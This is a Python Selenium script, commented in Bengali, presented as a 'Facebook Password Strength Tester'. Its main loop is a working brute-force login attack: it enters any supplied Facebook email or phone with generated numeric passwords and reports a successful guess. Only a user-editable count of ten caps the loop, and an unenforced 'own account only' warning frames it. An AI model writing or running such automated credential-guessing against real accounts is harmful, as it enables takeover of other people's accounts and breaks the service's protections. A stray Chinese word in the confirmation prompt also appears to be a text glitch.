import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import sys

class FacebookPasswordTester:
    def __init__(self):
        print("=" * 60)
        print("Facebook Password Strength Tester")
        print("শুধুমাত্র আপনার নিজের অ্যাকাউন্টের জন্য")
        print("=" * 60)
        
        # Chrome driver সেটআপ
        options = webdriver.ChromeOptions()
        options.add_argument('--disable-notifications')
        options.add_argument('--disable-infobars')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        
        self.driver = webdriver.Chrome(options=options)
        self.wait = WebDriverWait(self.driver, 10)
        
    def login_attempt(self, email, password):
        """Facebook লগইন চেষ্টা"""
        try:
            # Facebook লগইন পেজ
            self.driver.get("https://www.facebook.com/login")
            time.sleep(2)
            
            # ইউজারনেম ইনপুট
            email_field = self.driver.find_element(By.ID, "email")
            email_field.clear()
            email_field.send_keys(email)
            time.sleep(1)
            
            # পাসওয়ার্ড ইনপুট
            password_field = self.driver.find_element(By.ID, "pass")
            password_field.clear()
            password_field.send_keys(password)
            time.sleep(1)
            
            # লগইন বাটন ক্লিক
            login_button = self.driver.find_element(By.NAME, "login")
            login_button.click()
            time.sleep(3)
            
            # চেক করা সফল লগইন কি না
            current_url = self.driver.current_url
            
            if "checkpoint" in current_url or "login_attempt" in current_url:
                # CAPTCHA বা সিকিউরিটি চেক
                print("CAPTCHA বা সিকিউরিটি চেক প্রয়োজন!")
                return "security_check"
            elif "facebook.com" in current_url and "login" not in current_url:
                # লগইন সফল
                return "success"
            else:
                # লগইন ব্যর্থ
                return "failed"
                
        except Exception as e:
            print(f"Error: {str(e)}")
            return "error"
    
    def check_password_strength(self, password):
        """পাসওয়ার্ড স্ট্রেন্থ চেক"""
        score = 0
        issues = []
        
        # দৈর্ঘ্য চেক
        if len(password) < 6:
            issues.append("পাসওয়ার্ড খুব ছোট (কমপক্ষে ৬ ক্যারেক্টার)")
        elif len(password) >= 8:
            score += 1
        
        # সংখ্যা আছে কিনা
        if any(char.isdigit() for char in password):
            score += 1
        else:
            issues.append("পাসওয়ার্ডে সংখ্যা নেই")
        
        # বড় হাতের অক্ষর
        if any(char.isupper() for char in password):
            score += 1
        else:
            issues.append("বড় হাতের অক্ষর নেই")
        
        # ছোট হাতের অক্ষর
        if any(char.islower() for char in password):
            score += 1
        else:
            issues.append("ছোট হাতের অক্ষর নেই")
        
        # বিশেষ ক্যারেক্টার
        special_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/`~"
        if any(char in special_chars for char in password):
            score += 1
        else:
            issues.append("বিশেষ ক্যারেক্টার নেই")
        
        # খুব সাধারণ পাসওয়ার্ড
        common_passwords = [
            '123456', 'password', '12345678',
            '123456789', '12345', '1234567',
            'qwerty', 'abc123', '111111',
            '000000', 'admin', 'password1'
        ]
        
        if password in common_passwords:
            score = 0
            issues.append("এটি খুবই সাধারণ পাসওয়ার্ড")
        
        # রেটিং
        if score >= 4:
            strength = "শক্তিশালী"
        elif score >= 3:
            strength = "মোটামুটি"
        else:
            strength = "দুর্বল"
        
        return strength, issues, score
    
    def run_test(self):
        """মূল টেস্ট রান"""
        try:
            # ইউজার ইনপুট
            print("\n" + "-" * 40)
            username = input("আপনার Facebook ইমেইল/মোবাইল: ").strip()
            
            print(f"\nইউজার: {username}")
            print("পাসওয়ার্ড চেক শুরু হচ্ছে...")
            print("শুধুমাত্র 10টি পাসওয়ার্ড চেক করা হবে (000000 থেকে 000009)")
            print("-" * 40)
            
            found_password = None
            attempts = 0
            max_attempts = 10
            
            for i in range(max_attempts):
                # পাসওয়ার্ড জেনারেট (6 ডিজিট)
                password = f"{i:06d}"
                attempts += 1
                
                print(f"\n[{attempts}/{max_attempts}] চেষ্টা করছি: {password}")
                
                # লগইন চেষ্টা
                result = self.login_attempt(username, password)
                
                if result == "success":
                    found_password = password
                    print(f"✓ পাসওয়ার্ড পাওয়া গেছে: {password}")
                    
                    # পাসওয়ার্ড স্ট্রেন্থ চেক
                    strength, issues, score = self.check_password_strength(password)
                    
                    print(f"\n{'='*50}")
                    print("পাসওয়ার্ড বিশ্লেষণ:")
                    print(f"{'='*50}")
                    print(f"পাসওয়ার্ড: {password}")
                    print(f"স্ট্রেন্থ লেভেল: {strength}")
                    print(f"স্কোর: {score}/5")
                    
                    if issues:
                        print("\nসমস্যা:")
                        for issue in issues:
                            print(f"  ✗ {issue}")
                    
                    if strength == "দুর্বল":
                        print("\n⚠️ সতর্কতা: আপনার পাসওয়ার্ড খুবই দুর্বল!")
                        print("অবিলম্বে পাসওয়ার্ড পরিবর্তন করুন।")
                    
                    print(f"\nমোট চেষ্টা: {attempts}")
                    break
                    
                elif result == "security_check":
                    print("✗ CAPTCHA/সিকিউরিটি চেক - বন্ধ করতে হবে")
                    break
                    
                else:
                    print(f"✗ Wrong password: {password}")
                
                # প্রতিটি চেষ্টার মধ্যে ডিলে
                time.sleep(2)
            
            if not found_password:
                print(f"\n{'='*50}")
                print("কোনো পাসওয়ার্ড মিলেনি!")
                print(f"চেক করা হয়েছে: 000000 থেকে {max_attempts-1:06d}")
                print("="*50)
                
                print("\nপরামর্শ:")
                print("1. আপনার পাসওয়ার্ড 6 ডিজিটের সংখ্যা নয়")
                print("2. পাসওয়ার্ডে অক্ষর, সংখ্যা, বিশেষ চিহ্ন মিলিয়ে ব্যবহার করুন")
                print("3. কমপক্ষে 8 ক্যারেক্টার ব্যবহার করুন")
            
            # টেস্ট শেষে লগআউট
            try:
                self.driver.get("https://www.facebook.com/logout")
                time.sleep(2)
            except:
                pass
        
        except KeyboardInterrupt:
            print("\n\nটেস্ট বন্ধ করা হয়েছে")
        except Exception as e:
            print(f"\nError: {str(e)}")
        finally:
            # ব্রাউজার বন্ধ
            time.sleep(3)
            self.driver.quit()
            print("\n" + "="*60)
            print("টেস্ট সম্পন্ন!")
            print("="*60)

def main():
    """মেইন ফাংশন"""
    print("\n⚠️ গুরুত্বপূর্ণ সতর্কতা:")
    print("1. এটি শুধুমাত্র আপনার নিজের অ্যাকাউন্টের জন্য")
    print("2. Facebook এর Terms of Service লঙ্ঘন হতে পারে")
    print("3. আপনার অ্যাকাউন্ট Temporarily Locked হতে পারে")
    print("4. শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে")
    
    confirm = input("\nআপনি কি继续 করতে চান? (yes/no): ").lower()
    
    if confirm == 'yes':
        tester = FacebookPasswordTester()
        tester.run_test()
    else:
        print("\nপ্রোগ্রাম বন্ধ করা হয়েছে")
        sys.exit(0)

if __name__ == "__main__":
    # প্রয়োজনীয় লাইব্রেরি ইনস্টলেশন নির্দেশনা
    print("প্রয়োজনীয় লাইব্রেরি ইনস্টল করুন:")
    print("pip install selenium")
    print("pip install webdriver-manager")
    print("\nChrome ব্রাউজার প্রয়োজন হবে")
    
    # Chrome driver অটো ডাউনলোডের বিকল্প
    try:
        main()
    except ImportError:
        print("\nSelenium ইনস্টল করা নেই!")
        print("ইনস্টল করুন: pip install selenium")
    except Exception as e:
        print(f"\nError: {str(e)}")
